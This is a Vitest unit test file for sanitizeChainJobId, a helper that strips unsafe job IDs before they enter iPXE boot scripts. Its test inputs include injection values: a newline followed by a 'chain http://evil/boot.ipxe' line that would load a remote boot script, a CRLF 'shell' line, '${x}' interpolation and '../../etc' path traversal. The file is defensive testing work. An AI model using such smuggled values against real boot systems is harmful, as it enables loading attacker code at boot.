import { describe, expect, it } from 'vitest';

import { sanitizeChainJobId } from '../chain.helpers.js';

describe('sanitizeChainJobId', () => {
  it('passes through a conforming job_id', () => {
    expect(sanitizeChainJobId('job_123-abc.def:ghi')).toBe('job_123-abc.def:ghi');
    expect(sanitizeChainJobId('')).toBe('');
  });

  it('drops a newline-bearing job_id so it cannot inject iPXE script lines', () => {
    expect(sanitizeChainJobId('job1\nchain http://evil/boot.ipxe')).toBe('');
    expect(sanitizeChainJobId('job1\r\nshell')).toBe('');
  });

  it('drops job_ids with spaces or other control/injection characters', () => {
    expect(sanitizeChainJobId('job with spaces')).toBe('');
    expect(sanitizeChainJobId('job${x}')).toBe('');
    expect(sanitizeChainJobId('job/../../etc')).toBe('');
  });
});
